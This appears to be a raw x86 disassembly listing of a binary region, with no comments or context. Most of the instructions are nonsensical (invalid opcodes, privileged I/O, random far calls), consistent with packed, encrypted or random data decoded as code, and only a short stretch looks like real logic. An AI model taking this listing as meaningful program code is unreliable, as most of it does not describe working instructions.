  40898a:	rol    BYTE PTR [esi-0x57b15ad4],cl
  408990:	lahf   
  408991:	scas   al,BYTE PTR es:[edi]
  408992:	xor    DWORD PTR [ecx-0x6a],ebp
  408995:	popf   
  408996:	in     al,dx
  408997:	mov    eax,ds:0xf4255a56
  40899c:	mov    dl,ah
  40899e:	sub    al,0x2a
  4089a0:	add    bl,ch
  4089a2:	push   ecx
  4089a3:	mov    edi,DWORD PTR [ebx+0x34]
  4089a6:	sbb    DWORD PTR [ebx+0x5121db71],ecx
  4089ac:	div    BYTE PTR [ebx]
  4089ae:	popf   
  4089af:	xlat   BYTE PTR ds:[ebx]
  4089b0:	pusha  
  4089b1:	aaa    
  4089b2:	iret   
  4089b3:	sti    
  4089b4:	lods   al,BYTE PTR gs:[esi]
  4089b6:	inc    edi
  4089b7:	mov    ebx,ds
  4089b9:	push   es
  4089ba:	popf   
  4089bb:	adc    DWORD PTR [ebp-0x706fb918],esp
  4089c1:	out    dx,al
  4089c2:	aaa    
  4089c3:	push   ebp
  4089c4:	icebp  
  4089c5:	lahf   
  4089c6:	mov    edi,?
  4089c8:	(bad)  
  4089c9:	stos   DWORD PTR es:[edi],eax
  4089ca:	cwde   
  4089cb:	pushf  
  4089cc:	jecxz  0x408991
  4089ce:	ins    BYTE PTR es:[edi],dx
  4089cf:	xchg   ebp,eax
  4089d0:	add    DWORD PTR [ebx],0x858cdf47
  4089d6:	pop    ebp
  4089d7:	inc    DWORD PTR [ebx+0x73]
  4089da:	ror    dh,1
  4089dc:	jno    0x408a33
  4089de:	pushf  
  4089df:	iret   
  4089e0:	(bad)  
  4089e1:	or     eax,0x1eb9dab2
  4089e6:	dec    ebx
  4089e7:	call   0x9d9c:0x85f02306
  4089ee:	xchg   BYTE PTR [edx],ch
  4089f0:	dec    eax
  4089f1:	mov    edx,0xe20bc1f7
  4089f6:	inc    edx
  4089f7:	cmp    ebp,ebp
  4089f9:	cmp    al,0x2d
  4089fb:	inc    esp
  4089fc:	or     ah,BYTE PTR [ebp+0x24]
  4089ff:	pop    ss
  408a00:	pushf  
  408a01:	and    al,0xb7
  408a03:	pop    ecx
  408a04:	popa   
  408a05:	jge    0x408a68
  408a07:	pop    esp
  408a08:	fnstenv [eax+ebx*2-0x29]
  408a0c:	adc    al,0xa7
  408a0e:	cmp    ah,BYTE PTR [ecx]
  408a10:	test   DWORD PTR [edx],0x55abfd3f
  408a16:	je     0x4089ec
  408a18:	cmp    BYTE PTR [eax-0x58c88397],bl
  408a1e:	fdiv   DWORD PTR [esi+0x374038a8]
  408a24:	add    al,BYTE PTR [esi+eiz*1-0x31]
  408a28:	push   ecx
  408a29:	jnp    0x408a5b
  408a2b:	dec    ebx
  408a2c:	and    ah,BYTE PTR [eax]
  408a2e:	gs ins BYTE PTR es:[edi],dx
  408a30:	and    al,0xc3
  408a32:	bound  ebp,QWORD PTR [ebp+0x746d429]
  408a38:	lods   al,BYTE PTR ds:[esi]
  408a39:	cwde   
  408a3a:	loopne 0x4089c8
  408a3c:	dec    ebx
  408a3d:	sbb    al,0xb5
  408a3f:	ror    BYTE PTR [ebx],cl
  408a41:	push   cs
  408a42:	xchg   edi,eax
  408a43:	push   0xffffffb9
  408a45:	loope  0x408a67
  408a47:	pusha  
  408a48:	add    cl,BYTE PTR [ebx]
  408a4a:	aaa    
  408a4b:	xor    al,0xb8
  408a4d:	scas   eax,DWORD PTR es:[edi]
  408a4e:	loope  0x4089fa
  408a50:	cmp    DWORD PTR [ebx],0xffffffc4
  408a53:	fs sti 
  408a55:	pop    esi
  408a56:	in     eax,0xb5
  408a58:	inc    esp
  408a59:	outs   dx,DWORD PTR ds:[esi]
  408a5a:	jb     0x408ac4
  408a5c:	jge    0x408a4f
  408a5e:	jmp    0xb6f962c6
  408a63:	in     eax,0x62
  408a65:	inc    edx
  408a66:	pop    es
  408a67:	retf   
  408a68:	bnd js 0x408ae6
  408a6b:	xor    eax,0x9ae4277b
  408a70:	aas    
  408a71:	inc    esi
  408a72:	hlt    
  408a73:	xor    BYTE PTR [edi-0x39],cl
  408a76:	fwait
  408a77:	ins    DWORD PTR es:[edi],dx
  408a78:	repnz loopne 0x408a5a
  408a7b:	ins    DWORD PTR es:[edi],dx
  408a7c:	and    al,0xad
  408a7e:	je     0x408adf
  408a80:	sbb    DWORD PTR [ecx+esi*8-0x4046ffdd],edi
  408a87:	sahf   
  408a88:	xchg   ebp,eax
  408a89:	(bad)  
  408a8a:	loope  0x408a52
  408a8c:	or     DWORD PTR [esi+0x52],esi
  408a8f:	jbe    0x408a3c
  408a91:	in     eax,dx
  408a92:	in     eax,dx
  408a93:	sahf   
  408a94:	push   cs
  408a95:	and    eax,0x3de1a4cc
  408a9a:	sub    BYTE PTR [eax],bl
  408a9c:	or     cl,al
  408a9e:	call   0xbc04:0x309eee89
  408aa5:	sbb    eax,0xe50eb310
  408aaa:	add    ebp,DWORD PTR [ecx+0x3e8b004a]
  408ab0:	jecxz  0x408a6c
  408ab2:	xor    DWORD PTR es:[edx],0xffffffe3
  408ab6:	push   esi
  408ab7:	mov    ebp,DWORD PTR [edi+0x7ce18e4d]
  408abd:	mov    ch,0x66
  408abf:	pushf  
  408ac0:	mov    edi,0x469bcfac
  408ac5:	in     eax,0x1f
  408ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ac8:	pop    ebp
  408ac9:	stos   DWORD PTR es:[edi],eax
  408aca:	mov    esi,0x9b6bad48
  408acf:	jae    0x408a7e
  408ad1:	test   eax,0x4559741b
  408ad6:	ins    DWORD PTR es:[edi],dx
  408ad7:	jbe    0x408a9a
  408ad9:	fpatan 
  408adb:	repnz pop esp
  408add:	or     dl,bh
  408adf:	icebp  
  408ae0:	outs   dx,DWORD PTR ds:[esi]
  408ae1:	(bad)  
  408ae2:	(bad)  
  408ae4:	leave  
  408ae5:	imul   BYTE PTR [ecx]
  408ae7:	dec    ecx
  408ae8:	xchg   BYTE PTR [ebx+0x19],dh
  408aeb:	mov    WORD PTR [ebp-0x16],?
  408aee:	lock rol DWORD PTR [edi-0x4b],0x9e
  408af3:	or     DWORD PTR [eax],0xffffffa8
  408af6:	dec    edx
  408af7:	shl    DWORD PTR [ebx+0x38],cl
  408afa:	mov    ds:0xf11a9c6,eax
  408aff:	ficomp WORD PTR [ebp+edx*8-0x74]
  408b03:	or     al,0x41
  408b05:	sub    eax,0xfc5ad5d7
  408b0a:	or     cl,BYTE PTR [ebp+0x5b]
  408b0d:	arpl   WORD PTR [ecx+eax*1-0x34],sp
  408b11:	popf   
  408b12:	mov    ds:0xebc0979b,al
  408b17:	pop    esp
  408b18:	in     al,dx
  408b19:	cli    
  408b1a:	and    cl,BYTE PTR [eax+eax*4+0x5e]
  408b1e:	or     bh,dl
  408b20:	cld    
  408b21:	adc    ecx,DWORD PTR [ebp-0x2b]
  408b24:	mov    ss,WORD PTR [esi]
  408b26:	mov    dh,0xe3
  408b28:	test   eax,0xab95c7f7
  408b2d:	add    edx,DWORD PTR ds:0x623fa802
  408b33:	xchg   ebx,eax
  408b34:	stos   DWORD PTR es:[edi],eax
  408b35:	loop   0x408b27
  408b37:	loope  0x408b74
  408b39:	and    al,0x30
  408b3b:	pusha  
  408b3c:	lods   eax,DWORD PTR ds:[esi]
  408b3d:	retf   0x6333
  408b40:	ja     0x408b91
  408b42:	mov    ds:0x1cd7aa44,eax
  408b47:	push   ebx
  408b48:	es in  eax,0x8a
  408b4b:	dec    ebp
  408b4c:	mov    ds:0x851ffd2f,al
  408b51:	retf   
  408b52:	(bad)  
  408b53:	aas    
  408b54:	cmp    ecx,ebx
  408b56:	inc    ebp
  408b57:	test   al,0xc
  408b59:	dec    BYTE PTR [esi]
  408b5b:	test   DWORD PTR [esi+0x3ba8231c],ecx
  408b61:	dec    ebx
  408b62:	add    al,0x70
  408b64:	mov    ecx,0xf6896026
  408b69:	cmp    al,0x84
  408b6b:	mov    ah,0x1f
  408b6d:	sti    
  408b6e:	push   ds
  408b6f:	fistp  QWORD PTR [eax+eiz*2]
  408b72:	inc    ebp
  408b73:	popf   
  408b74:	jno    0x408bac
  408b76:	mov    eax,ds:0x559a0e0d
  408b7b:	std    
  408b7c:	pop    es
  408b7d:	call   0x3d92:0x5d9a64b1
  408b84:	xchg   ebx,eax
  408b85:	cmc    
  408b86:	xchg   edi,eax
  408b87:	push   ss
  408b88:	dec    esp
  408b89:	jns    0x408b9d
  408b8b:	mov    edi,ecx
  408b8d:	lods   eax,DWORD PTR ds:[esi]
  408b8e:	dec    esp
  408b8f:	in     al,0xf8
  408b91:	ds adc eax,0xe67ce047
  408b97:	mov    ecx,0xda1b9b9f
  408b9c:	cwde   
  408b9d:	js     0x408b30
  408b9f:	ret    0xfe41
  408ba2:	inc    ecx
  408ba3:	cmp    BYTE PTR [esi-0x6fbe827c],cl
  408ba9:	adc    DWORD PTR [edx-0x38],esi
  408bac:	adc    eax,0xefa5fd61
  408bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bb2:	cmp    esp,edx
  408bb4:	xchg   edi,eax
  408bb5:	iret   
  408bb6:	dec    eax
  408bb7:	sbb    eax,0x125c6226
  408bbc:	gs pop es
  408bbe:	lahf   
  408bbf:	jmp    0x408c0f
  408bc1:	das    
  408bc2:	adc    WORD PTR ss:[eax+ecx*1],0x12
  408bc8:	push   ecx
  408bc9:	push   ds
  408bca:	sar    BYTE PTR [ecx-0x7eaf677f],cl
  408bd0:	push   eax
  408bd1:	pop    ebx
  408bd2:	ins    DWORD PTR es:[edi],dx
  408bd3:	dec    ebp
  408bd4:	aaa    
  408bd5:	dec    esp
  408bd6:	ret    
  408bd7:	add    esp,DWORD PTR [ebp+0x27]
  408bda:	gs push ds
  408bdc:	mov    ebx,0xf54a1218
  408be1:	inc    ecx
  408be2:	mov    ebp,0xd428f04
  408be7:	sub    BYTE PTR [eax],bh
  408be9:	adc    BYTE PTR [edx],0x10
  408bec:	pop    ecx
  408bed:	cmp    al,BYTE PTR [ebp+0x66]
  408bf0:	imul   edi,edi,0xd098977c
  408bf6:	test   al,0x5d
  408bf8:	ja     0x408c42
  408bfa:	push   ss
  408bfb:	pop    ebp
  408bfc:	push   0x1
  408bfe:	mov    eax,0xd4a14740
  408c03:	mov    al,ds:0x36b7d50c
  408c08:	imul   ebp,DWORD PTR [ebp-0x9],0xffffff85
  408c0c:	dec    esi
  408c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c0e:	stos   DWORD PTR es:[edi],eax
  408c0f:	pop    esp
  408c10:	rol    BYTE PTR [edi+0x3ee03bb3],0x1e
  408c17:	push   esi
  408c18:	imul   ecx,DWORD PTR [edi-0x271d896a],0x6
  408c1f:	daa    
  408c20:	icebp  
  408c21:	sub    DWORD PTR [edx-0x6],esi
  408c24:	push   esi
  408c25:	dec    ebp
  408c26:	test   DWORD PTR [ecx+ebx*4+0x47120f54],edx
  408c2d:	idiv   DWORD PTR fs:[ebp+edi*1+0x2cdf38e1]
  408c35:	mov    edx,DWORD PTR [ebx+0x733f5586]
  408c3b:	mov    BYTE PTR [ebx+0x3e39c458],bl
  408c41:	aaa    
  408c42:	pop    ecx
  408c43:	mov    eax,DWORD PTR [ebp-0x20]
  408c46:	mov    edx,DWORD PTR [ebp-0x8]
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	ds jne 0x408c3d
  408c62:	fisubr WORD PTR [esp+eiz*8+0x7c]
  408c66:	jl     0x408c3f
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408bfa
  408c6c:	jp     0x408c8a
  408c6e:	pop    ebp
  408c6f:	or     ah,ah
  408c71:	jno    0x408cd1
  408c73:	push   cs
  408c74:	xlat   BYTE PTR ds:[ebx]
  408c75:	sub    al,0xb4
  408c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c78:	add    ebx,DWORD PTR [edi-0x2fa83e00]
  408c7e:	das    
  408c7f:	push   ebx
  408c80:	xlat   BYTE PTR ds:[ebx]
  408c81:	mov    bh,0x1c
  408c83:	into   
  408c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c85:	push   ecx
  408c86:	adc    edx,DWORD PTR [ecx+0x1a]
  408c89:	iret   
  408c8a:	pop    esi
  408c8b:	jb     0x408cd6
  408c8d:	mov    eax,0x4aed2f20
  408c92:	fimul  WORD PTR [edx+0x394342a7]
  408c98:	or     al,0xed
  408c9a:	daa    
  408c9b:	cdq    
  408c9c:	xchg   esp,eax
  408c9d:	leave  
  408c9e:	jg     0x408cb8
  408ca0:	sub    eax,DWORD PTR [ebp-0x3a]
  408ca3:	mov    ds:0x223e37a5,eax
  408ca8:	sub    bh,al
  408caa:	push   0x6f
  408cac:	sub    cl,BYTE PTR [esp+eax*2]
  408caf:	cdq    
  408cb0:	cmc    
  408cb1:	ffreep st(0)
  408cb3:	cmp    DWORD PTR [eax-0x2a9634f4],ecx
  408cb9:	frstor [ebp-0x6a012223]
  408cbf:	lock mov cl,0xeb
  408cc2:	mov    ?,WORD PTR [esi-0x65]
  408cc5:	cld    
  408cc6:	imul   esi,DWORD PTR [ebx+0x72adacf0],0x24
  408ccd:	cdq    
  408cce:	push   ecx
  408ccf:	cdq    
  408cd0:	mov    dl,0xd0
  408cd2:	add    al,0xeb
  408cd4:	arpl   WORD PTR [edi-0x2781ad25],sp
  408cda:	sub    BYTE PTR [ebp-0x4],dl
  408cdd:	xchg   ebx,eax
  408cde:	inc    esi
  408cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce0:	cdq    
  408ce1:	test   al,0xb8
  408ce3:	xchg   ecx,eax
  408ce4:	test   DWORD PTR ds:0x44cd7825,ecx
  408cea:	lods   al,BYTE PTR ds:[esi]
  408ceb:	(bad)  
  408cec:	or     edx,esi
  408cee:	dec    esp
  408cef:	cdq    
  408cf0:	push   esp
  408cf1:	gs mov ebx,0xf75d0f32
  408cf7:	stos   BYTE PTR es:[edi],al
  408cf8:	test   al,0x97
  408cfa:	push   cs
  408cfb:	fisub  DWORD PTR [ecx]
  408cfd:	loope  0x408ca7
  408cff:	xchg   esp,eax
  408d00:	pusha  
  408d01:	push   es
  408d02:	cmp    BYTE PTR [ebx],bl
  408d04:	sub    al,0xcc
  408d06:	push   ebp
  408d07:	inc    edx
  408d08:	pop    ebx
  408d09:	and    BYTE PTR [esi],0xe
  408d0c:	cmp    eax,0x1a3ea195
  408d11:	(bad)  [eax-0x2f]
  408d14:	cmc    
  408d15:	mov    eax,0x93abddfb
  408d1a:	add    eax,DWORD PTR [esi+0xac1ca7b]
  408d20:	push   cs
  408d21:	mov    dh,BYTE PTR [ebp-0x9]
  408d24:	xlat   BYTE PTR ds:[ebx]
  408d25:	xor    eax,0x3c440920
  408d2a:	adc    DWORD PTR [edi],edi
  408d2c:	out    dx,al
  408d2d:	scas   eax,DWORD PTR es:[edi]
  408d2e:	jb     0x408cfa
  408d30:	and    eax,0xb084927d
  408d35:	and    al,0x27
  408d37:	inc    edx
  408d38:	xor    edi,edi
  408d3a:	in     al,0x45
  408d3c:	out    0xd5,al
  408d3e:	adc    DWORD PTR [edx+0xf],ebx
  408d41:	sub    dh,BYTE PTR ds:0x4c3cdd98
  408d47:	gs sahf 
  408d49:	loop   0x408dc1
  408d4b:	jp     0x408d64
  408d4d:	loopne 0x408d0c
  408d4f:	popa   
  408d50:	mov    al,ds:0x1bb08b0e
  408d55:	loope  0x408d57
  408d57:	lea    ebp,[esi]
  408d59:	rcr    BYTE PTR [ecx-0x1fb596f0],cl
  408d5f:	jge    0x408da9
  408d61:	mov    bl,0x11
  408d63:	mov    ch,0x38
  408d65:	sar    ebx,0x68
  408d68:	test   al,0xc3
  408d6a:	or     cl,0xca
  408d6d:	test   BYTE PTR [esi+0x3],cl
  408d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d71:	retf   
  408d72:	xchg   edi,eax
  408d73:	pop    eax
  408d74:	adc    DWORD PTR [ebp+0x3b3616f3],esi
  408d7a:	out    dx,al
  408d7b:	sbb    dl,BYTE PTR [edx+0x37]
  408d7e:	fild   WORD PTR [edx+0x3d74d14]
  408d84:	mov    ebx,ebx
  408d86:	popf   
  408d87:	outs   dx,DWORD PTR ds:[esi]
  408d88:	push   esi
  408d89:	aaa    
  408d8a:	imul   ebp,DWORD PTR [ebx+0x786d8050],0x55
  408d91:	dec    esp
  408d92:	mov    ch,0x44
  408d94:	lods   al,BYTE PTR ds:[esi]
  408d95:	cmp    BYTE PTR [ebx+0x41f37248],ch
  408d9b:	jl     0x408d8e
  408d9d:	inc    ebx
  408d9e:	es dec esi
  408da0:	pop    ds
  408da1:	pop    ebp
  408da2:	mov    ah,0x48
  408da5:	jns    0x408d69
  408da7:	adc    al,0xfb
  408da9:	add    dh,ch
  408dab:	cwde   
  408dac:	(bad)  
  408dad:	push   ebx
  408dae:	pop    ss
  408daf:	push   0x74537559
  408db4:	arpl   cx,ax
  408db6:	adc    al,0x6a
  408db8:	pop    edx
  408db9:	pop    ebx
  408dba:	add    ch,0x98
  408dbd:	dec    edx
  408dbe:	xor    al,0xbc
  408dc0:	mov    esp,0x7450f854
  408dc5:	sbb    BYTE PTR [ebx],cl
  408dc7:	(bad)  
  408dc8:	call   0x5ee9:0x9c204050
  408dcf:	xchg   ecx,eax
  408dd0:	sbb    eax,0x9c8d9716
  408dd5:	imul   eax,esi,0x50
  408dd8:	test   eax,0xd1bce88f
  408ddd:	pop    edx
  408dde:	xlat   BYTE PTR ds:[ebx]
  408ddf:	or     ebp,ebp
  408de1:	(bad)  
  408de2:	cmp    al,0x80
  408de4:	jle    0x408e23
  408de6:	xchg   ecx,eax
  408de7:	add    cl,BYTE PTR gs:[esi]
  408dea:	add    bh,0x1e
  408ded:	mov    ebp,0xcbd3df26
  408df2:	add    ebx,DWORD PTR [esi]
  408df4:	sub    BYTE PTR [ecx-0x37],dl
  408df7:	stos   DWORD PTR es:[edi],eax
  408df8:	sbb    eax,0x71648f12
  408dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dfe:	push   esi
  408dff:	loop   0x408dcd
  408e01:	scas   al,BYTE PTR es:[edi]
  408e02:	ror    BYTE PTR [edx],1
  408e04:	das    
  408e05:	fisttp WORD PTR [eax]
  408e07:	jno    0x408dde
  408e09:	adc    al,0x70
  408e0b:	scas   al,BYTE PTR es:[edi]
  408e0c:	(bad)  
  408e0d:	sti    
  408e0e:	in     al,dx
  408e0f:	push   0xffffff9a
  408e11:	xchg   ecx,eax
  408e12:	or     eax,0xaf2be759
  408e17:	add    cl,dh
  408e19:	in     al,0x10
  408e1b:	call   0x92bcccd1
  408e20:	mov    es,esp
  408e22:	scas   al,BYTE PTR es:[edi]
  408e23:	adc    BYTE PTR [edi-0x80],dl
  408e26:	and    al,0xf2
  408e28:	scas   al,BYTE PTR es:[edi]
  408e29:	mov    ecx,0xc6b06597
  408e2e:	inc    ecx
  408e2f:	inc    edx
  408e30:	dec    esi
  408e31:	sub    al,0x74
  408e33:	lods   al,BYTE PTR ds:[esi]
  408e34:	cdq    
  408e35:	xchg   esi,eax
  408e36:	scas   eax,DWORD PTR es:[edi]
  408e37:	mov    ecx,0x679d95ca
  408e3c:	sbb    BYTE PTR [edi-0x62],dh
  408e3f:	cmp    ch,BYTE PTR [esp+ebp*4]
  408e42:	das    
  408e43:	(bad)  
  408e44:	cmp    eax,0x64fb601e
  408e49:	(bad)  
  408e4a:	and    al,0x37
  408e4c:	in     eax,dx
  408e4d:	push   ecx
  408e4e:	jmp    0x408e0d
  408e50:	pop    ebx
  408e51:	(bad)  
  408e52:	push   ds
  408e53:	or     DWORD PTR ds:0x16bce248,esi
  408e59:	cld    
  408e5a:	ret    0x140b
  408e5d:	cmp    eax,0x69fc648c
  408e62:	xor    esi,0x9d8fa4ce
  408e68:	xchg   ebp,eax
  408e69:	add    edi,DWORD PTR [esi-0x323b6286]
  408e6f:	mov    ah,0xaf
  408e71:	jp     0x408e61
  408e73:	xchg   dl,bl
  408e75:	loope  0x408ea5
  408e77:	cli    
  408e78:	ror    DWORD PTR [ebx+0x2935ccee],1
  408e7e:	in     eax,0x92
  408e80:	sub    bh,al
  408e82:	in     al,dx
  408e83:	jp     0x408edc
  408e85:	addr16 push gs
  408e88:	enter  0x9c9b,0x7c
  408e8c:	sub    ebx,DWORD PTR [esi+edx*2-0x5245e54]
  408e93:	aaa    
  408e94:	xor    eax,0x5fa1672e
  408e99:	mov    dl,BYTE PTR [edi-0x2f456b74]
  408e9f:	adc    al,0x46
  408ea1:	std    
  408ea2:	enter  0xcadb,0x2c
  408ea6:	jecxz  0x408e77
  408ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eaa:	jp     0x408e69
  408eac:	repz xchg ebx,eax
  408eae:	pop    ebp
  408eaf:	not    DWORD PTR [ebx]
  408eb1:	ins    DWORD PTR es:[edi],dx
  408eb2:	dec    ecx
  408eb3:	and    al,0x2f
  408eb5:	out    dx,eax
  408eb6:	cmp    cl,BYTE PTR [eax]
  408eb8:	aas    
  408eb9:	sub    cl,BYTE PTR [ecx-0x16]
  408ebc:	add    eax,0x370a1492
  408ec1:	and    ah,BYTE PTR [edx+0x45]
  408ec4:	adc    al,0x1a
  408ec6:	jne    0x408e4c
  408ec8:	mov    ds:0x8eb1aabe,eax
  408ecd:	sbb    ebp,ecx
  408ecf:	push   edi
  408ed0:	shr    DWORD PTR [eax-0x4de69926],0x11
  408ed7:	adc    DWORD PTR fs:[ecx-0x72],edi
  408edb:	dec    esi
  408edc:	rol    esi,cl
  408ede:	lods   al,BYTE PTR ds:[esi]
  408edf:	repnz pop ebp
  408ee1:	dec    ebp
  408ee2:	mov    dh,0x2a
  408ee4:	adc    bh,BYTE PTR [ecx+0x6f32be53]
  408eea:	jp     0x408f0c
  408eec:	daa    
  408eed:	jno    0x408ee9
  408eef:	and    cl,bh
  408ef1:	adc    al,0x33
  408ef3:	mov    esp,0x6a244217
  408ef8:	fistp  WORD PTR [ebx-0x6c9f58fb]
  408efe:	test   DWORD PTR [edi],ebx
  408f00:	(bad)  
  408f01:	out    0xa4,al
  408f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f04:	int    0xd2
  408f06:	outs   dx,BYTE PTR ds:[esi]
  408f07:	jns    0x408f68
  408f09:	outs   dx,DWORD PTR ds:[esi]
  408f0a:	or     ebp,DWORD PTR [edx]
  408f0c:	popf   
  408f0d:	mov    edx,0x17a933a6
  408f12:	jmp    0x408ead
  408f14:	push   edx
  408f15:	mov    edx,0x6531430c
  408f1a:	adc    BYTE PTR [eiz*1-0x55cea198],dh
  408f21:	(bad)  
  408f23:	out    dx,al
  408f24:	enter  0x50c2,0xd
  408f28:	mov    ecx,0x21f8a622
  408f2d:	test   DWORD PTR [ebx-0x76],edi
  408f30:	mov    esi,0x401e3c3
  408f35:	inc    ecx
  408f36:	mov    ebx,0x78fe100b
  408f3b:	js     0x408f30
  408f3d:	ins    BYTE PTR es:[edi],dx
  408f3e:	push   esi
  408f3f:	mov    edi,0xd2151620
  408f44:	push   0x14
  408f46:	push   DWORD PTR [edi]
  408f48:	test   ah,bh
  408f4a:	ja     0x408fca
  408f4c:	adc    al,0x4a
  408f4e:	ret    0xd5d6
  408f51:	addr16 inc cl
  408f54:	cs cli 
  408f56:	dec    edx
  408f57:	shl    esi,cl
  408f59:	sbb    esp,edx
  408f5b:	push   eax
  408f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f5d:	mov    ebp,0x68b2a02d
  408f62:	pop    esp
  408f63:	arpl   WORD PTR [esi+0x613e6909],ax
  408f69:	jl     0x408f6f
  408f6b:	inc    ecx
  408f6c:	retf   0xb53d
  408f6f:	jg     0x408f0f
  408f71:	loop   0x408f58
  408f73:	xor    DWORD PTR [esi+0x7bb181db],0x4b
  408f7a:	sar    cl,cl
  408f7c:	mov    cl,0xde
  408f7e:	jge    0x408fc0
  408f80:	adc    BYTE PTR [esi+eax*1+0x22],0x39
  408f85:	test   esi,esi
  408f87:	call   0x7cdf:0x74565442
  408f8e:	fdiv   DWORD PTR [ebx]
  408f90:	gs xchg ebp,eax
  408f92:	adc    esp,DWORD PTR [edi-0x38658bda]
  408f98:	xor    BYTE PTR [edx+ebx*2-0x71dac778],dh
  408f9f:	mov    dl,0xa9
  408fa1:	add    DWORD PTR [edx+edx*2-0x48eb8d00],edx
  408fa8:	adc    eax,0xb55793c7
  408fad:	cmc    
  408fae:	int    0x28
  408fb0:	sar    ebp,1
  408fb2:	cmp    al,0x3a
  408fb4:	adc    eax,0xc246b751
  408fb9:	add    dl,0x9f
  408fbc:	mov    ecx,0x7061e6c
  408fc1:	retf   
  408fc2:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408fc4:	add    edx,esi
  408fc6:	imul   edx,edi
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [ebx+esi*1+0x37],ebp
  408fde:	pop    eax
  408fdf:	ffreep st(7)
  408fe1:	loopne 0x40905f
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x408fd2
  408fe9:	add    ah,BYTE PTR [ecx+0x36]
  408fec:	(bad)
  408fef:	bound  ecx,QWORD PTR [edi+0x6b131601]
  408ff5:	jns    0x408f7e
  408ff7:	xchg   ebx,eax
  408ff8:	test   DWORD PTR gs:[esi],ecx
  408ffb:	push   eax
  408ffc:	fnstenv ds:0x60b91f2d
  409002:	xchg   BYTE PTR [eax+0x3bf34d01],bh
  409008:	iret   
  409009:	aaa    
  40900a:	out    dx,al
  40900b:	retf   0x610f
  40900e:	in     eax,dx
  40900f:	(bad)  
  409011:	adc    eax,0xe09039aa
  409016:	mov    edx,ebx
  409018:	pop    es
  409019:	push   0x6894383b
  40901e:	push   esp
  40901f:	jnp    0x409073
  409021:	stc    
  409022:	sti    
  409023:	mov    WORD PTR [eax+edi*4],?
  409026:	repz jno 0x408fd4
  409029:	cmp    eax,0x72aed7e8
  40902e:	icebp  
  40902f:	shr    DWORD PTR [ebx+0x47],cl
  409032:	mov    edi,0x25f9e890
  409037:	jecxz  0x409058
  409039:	xchg   edi,eax
  40903a:	pushf  
  40903b:	pop    edx
  40903c:	stos   DWORD PTR es:[edi],eax
  40903d:	das    
  40903e:	int3   
  40903f:	(bad)  
  409040:	aas    
  409041:	dec    ebx
  409042:	sub    DWORD PTR [edx],ebp
  409044:	dec    ebp
  409045:	stos   DWORD PTR es:[edi],eax
  409046:	rcr    esi,cl
  409048:	mov    dh,BYTE PTR [edx-0x3c]
  40904b:	jns    0x409017
  40904d:	push   ss
  40904e:	sub    BYTE PTR [edx],dh
  409050:	(bad)  
  409052:	mov    dl,0x2b
  409054:	jmp    0x409031
  409056:	mov    bl,0xb7
  409058:	scas   al,BYTE PTR es:[edi]
  409059:	fwait
  40905a:	pop    eax
  40905b:	outs   dx,BYTE PTR ds:[esi]
  40905c:	enter  0x4985,0xfe
  409060:	ror    DWORD PTR [ecx+ecx*2+0x1a],1
  409064:	popf   
  409065:	push   eax
  409066:	out    0xcc,eax
  409068:	dec    edi
  409069:	scas   eax,DWORD PTR es:[edi]
  40906a:	push   eax
  40906b:	sub    ebx,DWORD PTR [ebx-0x4c6f07ce]
  409071:	inc    ebx
  409072:	mov    al,0x77
  409074:	nop
  409075:	dec    ecx
  409076:	aam    0x39
  409078:	sub    al,0x50
  40907a:	clc    
  40907b:	es inc esi
  40907d:	pop    ebx
  40907e:	xor    al,BYTE PTR [ecx+0x7ac119f5]
  409084:	aas    
  409085:	push   ebx
  409086:	push   ebp
  409087:	mov    eax,ds:0xd04d515b
  40908c:	rcl    BYTE PTR [esi+edx*2],cl
  40908f:	xor    ebp,DWORD PTR ds:0x3137ddfb
  409095:	in     al,0x97
  409097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409098:	enter  0x480,0xb2
  40909c:	and    esi,DWORD PTR [ebp-0x3d37c2b4]
  4090a2:	cld    
  4090a3:	(bad)  
  4090a4:	std    
  4090a5:	or     edi,0x36b65501
  4090ab:	cmp    DWORD PTR [eax],edx
  4090ad:	ja     0x4090ad
  4090af:	sub    edx,DWORD PTR [ebx-0x5b4743ff]
  4090b5:	and    ah,BYTE PTR [eax+ecx*8+0x25]
  4090b9:	ins    DWORD PTR es:[edi],dx
  4090ba:	or     ebp,edx
  4090bc:	stos   DWORD PTR es:[edi],eax
  4090bd:	and    al,0xfa
  4090bf:	push   ds
  4090c0:	int3   
  4090c1:	push   esp
  4090c2:	xor    BYTE PTR [edi-0x1a],al
  4090c5:	(bad)  
  4090c8:	pop    ss
  4090c9:	popa   
  4090ca:	addr16 push 0x2b
  4090cd:	or     dh,BYTE PTR [esi]
  4090cf:	adc    al,0x5
  4090d1:	add    BYTE PTR [ebx-0x45],dh
  4090d4:	push   edi
  4090d5:	pop    es
  4090d6:	loop   0x409091
  4090d8:	mov    ds:0xc6d0b793,al
  4090dd:	jo     0x409108
  4090df:	(bad)  
  4090e0:	call   0x6084:0x5098c50a
  4090e7:	out    dx,al
  4090e8:	mov    ds:0x575c24f5,eax
  4090ed:	xor    BYTE PTR [eax-0x7f3bb70d],0x54
